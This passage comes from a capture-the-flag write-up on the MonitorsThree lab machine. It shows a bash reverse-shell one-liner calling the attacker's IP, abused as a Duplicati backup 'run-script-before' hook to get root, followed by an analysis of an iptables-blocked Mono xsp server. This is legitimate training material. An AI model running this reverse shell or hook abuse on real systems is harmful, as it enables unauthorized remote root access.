bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

I’ll make sure to set it executable:

```

marcus@monitorsthree:/dev/shm$ vim 0xdf.sh
marcus@monitorsthree:/dev/shm$ chmod +x 0xdf.sh 

```

I’ll create a new backup, and it doesn’t really matter what I put for destination and source, as long as they are valid. When I get to the last screen, before accepting the defaults, I’ll look at the “Advanced options”:

![image-20240828162939252](/img/image-20240828162939252.png)

There’s a bunch that run scripts:

![image-20240828163002356](/img/image-20240828163002356.png)

I’ll pick `run-script-before`, and set it to my reverse shell:

![image-20240828163036735](/img/image-20240828163036735.png)

When I Save and then click “Run now”, I get a shell as root in the container at `nc`:

```

oxdf@hacky$ nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.10.11.30 55406
bash: cannot set terminal process group (146): Inappropriate ioctl for device
bash: no job control in this shell
root@c6f014fbbd51:/app/duplicati#

```

Because of the `/source` directory, I have full host access:

```

root@c6f014fbbd51:/source/root# cat root.txt
f039facf************************

```

And that’s easy to turn into a full root shell if I want (mess with `authorized_keys`, `sudoers`, `cron` files, `passwd`, etc).

## Beyond Root - 8084

### Identify xsp Webserver

I am very curious to know what is happening on port 8084. As I mentioned [above](#network), it doesn’t seem to respond to `curl` or `nc` connections.

`netstat` shows the process listening is `mono`:

```

root@monitorsthree:~# netstat -tnlp | grep 8084
tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      1252/mono

```

`mono` is a binary for running .NET executables on Linux. That process is running the `xsp4.exe` binary:

```

root@monitorsthree:~# ps auxww | grep 1252
www-data    1252  0.0  1.0 283924 41600 ?        Sl   Jan13   0:00 /usr/bin/mono /usr/lib/mono/4.5/xsp4.exe --port 8084 --address 0.0.0.0 --appconfigdir /etc/xsp4 --nonstop

```

xsp is [Mono’s ASP.NET web server](https://github.com/mono/xsp). The configuration is in `/etc/xsp4`, and there are two potential configs, both of which point to `/usr/share/monodoc/web`:

```

root@monitorsthree:/etc/xsp4# ls
conf.d  debian.webapp
root@monitorsthree:/etc/xsp4# cat conf.d/monodoc-http/10_monodoc-http 
# This is the configuration file
# for the monodoc-http
path = /usr/share/monodoc/web
alias = /monodoc
root@monitorsthree:/etc/xsp4# cat debian.webapp 
<apps>
  <web-application>
    <name>monodoc</name>
    <vpath>/monodoc</vpath>
    <path>/usr/share/monodoc/web</path>
  </web-application>
</apps>

```

This directory has a website in it:

```

root@monitorsthree:/usr/share/monodoc/web# ls
api.master  App_Code  Global.asax  index.aspx  monodoc.ashx  monodoc.css  plugins  plugins.def  README.md  robots.txt  skins  views  web.config

```

### IPTables

The reason nothing replies is how `iptables` is configured:

```

root@monitorsthree:~# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
DROP       tcp  --  anywhere             anywhere             tcp dpt:8084
ACCEPT     tcp  --  localhost            anywhere             tcp dpt:8084
DROP       tcp  --  anywhere             anywhere             tcp dpt:8084
ACCEPT     tcp  --  localhost            anywhere             tcp dpt:8084

Chain FORWARD (policy DROP)
target     prot opt source               destination
DOCKER-USER  all  --  anywhere             anywhere
DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination

Chain DOCKER (2 references)
target     prot opt source               destination
ACCEPT     tcp  --  anywhere             172.18.0.2           tcp dpt:8200

Chain DOCKER-ISOLATION-STAGE-1 (1 references)
target     prot opt source               destination
DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere
DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere
RETURN     all  --  anywhere             anywhere

Chain DOCKER-ISOLATION-STAGE-2 (2 references)
target     prot opt source               destination
DROP       all  --  anywhere             anywhere
DROP       all  --  anywhere             anywhere
RETURN     all  --  anywhere             anywhere

Chain DOCKER-USER (1 references)
target     prot opt source               destination
RETURN     all  --  anywhere             anywhere
root@monitorsthree:~# iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:8084
2    ACCEPT     tcp  --  localhost            anywhere             tcp dpt:8084
3    DROP       tcp  --  anywhere             anywhere             tcp dpt:8084
4    ACCEPT     tcp  --  localhost            anywhere             tcp dpt:8084

Chain FORWARD (policy DROP)
num  target     prot opt source               destination
1    DOCKER-USER  all  --  anywhere             anywhere
2    DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere
3    ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
4    DOCKER     all  --  anywhere             anywhere
5    ACCEPT     all  --  anywhere             anywhere
6    ACCEPT     all  --  anywhere             anywhere
7    ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
8    DOCKER     all  --  anywhere             anywhere
9    ACCEPT     all  --  anywhere             anywhere
10   ACCEPT     all  --  anywhere             anywhere

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination

Chain DOCKER (2 references)
num  target     prot opt source               destination
1    ACCEPT     tcp  --  anywhere             172.18.0.2           tcp dpt:8200

Chain DOCKER-ISOLATION-STAGE-1 (1 references)
num  target     prot opt source               destination
1    DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere
2    DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere
3    RETURN     all  --  anywhere             anywhere

Chain DOCKER-ISOLATION-STAGE-2 (2 references)
num  target     prot opt source               destination
1    DROP       all  --  anywhere             anywhere
2    DROP       all  --  anywhere             anywhere
3    RETURN     all  --  anywhere             anywhere

Chain DOCKER-USER (1 references)
num  target     prot opt source               destination
1    RETURN     all  --  anywhere             anywhere

```

The first rule in `INPUT` blocks traffic from anywhere to anywhere if the destination port is 8084. The next three rules don’t matter, as they will never hit on anything that doesn’t match on the first one. I can show this is what’s blocking by looking at the amount of traffic the rule has handled. On a fresh boot, the `pkts` and `bytes` field for the rule are both 0:

```

root@monitorsthree:~# iptables -L INPUT -v -n
Chain INPUT (policy ACCEPT 569 packets, 53626 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8084
    0     0 ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:8084
    0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8084
    0     0 ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:8084

```

After a curl attempt, this has increased:

```

root@monitorsthree:~# curl localhost:8084
^C
root@monitorsthree:~# iptables -L INPUT -v -n
Chain INPUT (policy ACCEPT 717 packets, 63854 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    7   420 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8084
    0     0 ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:8084
    0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8084
    0     0 ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:8084

```

If I take down the first rule, I’m able to hit the webserver:

```

root@monitorsthree:~# iptables -D INPUT 1
root@monitorsthree:~# curl localhost:8084
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">
body { background-color: #FFFFFF; font-size: .75em; font-family: Verdana, Helvetica, Sans-Serif; margin: 0; padding: 0; color: #696969; }
a:link { color: #000000; text-decoration: underline; }
a:visited { color: #000000; }
a:hover { color: #000000; text-decoration: none; }
a:active { color: #12eb87; }
p, ul { margin-bottom: 20px; line-height: 1.6em; }
pre { font-size: 1.2em; margin-left: 20px; margin-top: 0px; }
h1, h2, h3, h4, h5, h6 { font-size: 1.6em; color: #000; font-family: Arial, Helvetica, sans-serif; }
h1 { font-weight: bold; margin-bottom: 0; margin-top: 0; padding-bottom: 0; }
h2 { font-size: 1em; padding: 0 0 0px 0; color: #696969; font-weight: normal; margin-top: 0; margin-bottom: 20px; }
h2.exceptionMessage { white-space: pre; }
h3 { font-size: 1.2em; }
h4 { font-size: 1.1em; }
h5, h6 { font-size: 1em; }
#header { position: relative; margin-bottom: 0px; color: #000; padding: 0; background-color: #5c87b2; height: 38px; padding-left: 10px; }
#header h1 { font-weight: bold; padding: 5px 0; margin: 0; color: #fff; border: none; line-height: 2em; font-family: Arial, Helvetica, sans-serif; font-size: 32px !important; }
#header-image { float: left; padding: 3px; margin-left: 1px; margin-right: 1px; }
#header-text { color: #fff; font-size: 1.4em; line-height: 38px; font-weight: bold; }
#main { padding: 20px 20px 15px 20px; background-color: #fff; _height: 1px; }
#footer { color: #999; padding: 5px 0; text-align: left; line-height: normal; margin: 20px 0px 0px 0px; font-size: .9em; border-top: solid 1px #5C87B2; }
#footer-powered-by { float: right; }
.details { font-family: monospace; border: solid 1px #e8eef4; white-space: pre; font-size: 1.2em; overflow: auto; padding: 6px; margin-top: 6px; background-color: #eeeeff; color: 555555 }
.details-wrapped { white-space: normal }
.details-header { margin-top: 1.5em }
.details-header a { font-weight: bold; text-decoration: none }
p { margin-bottom: 0.3em; margin-top: 0.1em }
.sourceErrorLine { color: #770000; font-weight: bold; }
</style>
<script type="text/javascript">
        var hideElementsById = new Array ();
        window.onload = function () {
                if (!hideElementsById || hideElementsById.length < 1)
                        return;
                for (index in hideElementsById)
                        toggle (hideElementsById [index]);
        }

        function toggle (divId)
        {
                var e = document.getElementById (divId);
                if (!e)
                        return;
                var h = document.getElementById (divId + "Hint");
                if (e.style.display == "block" || e.style.display == "") {
                        e.style.display = "none";
                        if (h)
                                h.innerHTML = " (click to show)";
                } else {
                        e.style.display = "block";
                        if (h)
                                h.innerHTML = " (click to hide)";
                }
        }
</script>
<title>Error 400</title>
</head>
<body>
<div class="page">
<div id="header">
<div id="header-text">Application Exception</div>
</div>
<div id="main">
  <h1>System.ArgumentOutOfRangeException</h1>
  <h2 class="exceptionMessage">startIndex cannot be larger than length of string.
Parameter name: startIndex</h2>
  <p><strong>Description:</strong> HTTP 400.Error processing request.</p><p><strong>Details:</strong> Non-web exception. Exception origin (name of application or object): mscorlib.</p>
<div><strong>Exception stack trace:</strong></div>
<div class="details">  at System.String.Substring (System.Int32 startIndex, System.Int32 length) [0x0001d] in &lt;d636f104d58046fd9b195699bcb1a744&gt;:0
  at System.String.Substring (System.Int32 startIndex) [0x00008] in &lt;d636f104d58046fd9b195699bcb1a744&gt;:0
  at Mono.WebServer.MonoWorkerRequest.AssertFileAccessible () [0x0003b] in &lt;cb67e34e0d12485694dd7ff80bee019d&gt;:0
  at Mono.WebServer.MonoWorkerRequest.ProcessRequest () [0x0000b] in &lt;cb67e34e0d12485694dd7ff80bee019d&gt;:0 </div><div id="footer">
  <div style="color:Black;"><strong>Version Information:</strong> <tt>6.12.0.200 (tarball Tue Jul 11 21:37:50 UTC 2023)</tt>; ASP.NET Version: <tt>4.0.30319.42000</tt></div>
  <div id="footer-powered-by">Powered by <a href="http://mono-project.com/">Mono</a></div>
</div>
</div>
</div>
</body>
</html>

<!--
[System.Web.HttpException]: Bad request

[System.ArgumentOutOfRangeException]: startIndex cannot be larger than length of string.
Parameter name: startIndex
  at System.String.Substring (System.Int32 startIndex, System.Int32 length) [0x0001d] in <d636f104d58046fd9b195699bcb1a744>:0
  at System.String.Substring (System.Int32 startIndex) [0x00008] in <d636f104d58046fd9b195699bcb1a744>:0
  at Mono.WebServer.MonoWorkerRequest.AssertFileAccessible () [0x0003b] in <cb67e34e0d12485694dd7ff80bee019d>:0
  at Mono.WebServer.MonoWorkerRequest.ProcessRequest () [0x0000b] in <cb67e34e0d12485694dd7ff80bee019d>:0
-->

```

It’s crashing, presumably because the site is not configured.

### Theory

Duplicati is an executable that runs under `mono`. On MonitorsThree, it’s running from a Docker container:

```

root@monitorsthree:~# docker ps
CONTAINER ID   IMAGE                                  COMMAND   CREATED        STATUS         PORTS                      NAMES
c6f014fbbd51   lscr.io/linuxserver/duplicati:latest   "/init"   7 months ago   Up 6 minutes   127.0.0.1:8200->8200/tcp   duplicati
root@monitorsthree:~# docker exec -it duplicati bash
root@c6f014fbbd51:/# ps -auxww | grep -i duplicati
root          41  0.0  0.0    216    68 ?        S    21:24   0:00 s6-supervise svc-duplicati
root         144  0.1  0.9 149284 38684 ?        Ssl  21:24   0:00 mono Duplicati.Server.exe --webservice-interface=any --server-datafolder=/config --webservice-allowed-hostnames=*
root         160  0.3  1.5 1109184 62876 ?       Sl   21:24   0:01 /usr/bin/mono-sgen /app/duplicati/Duplicati.Server.exe --webservice-interface=any --server-datafolder=/config --webservice-allowed-hostnames=*

```

My best guess is that the box creator originally installed Duplicati in some way that also installed and set to run `xsp4.exe`. Then later, when they decided to run from a container, they didn’t fully clean up. Very much speculation, but seems like a reasonable guess.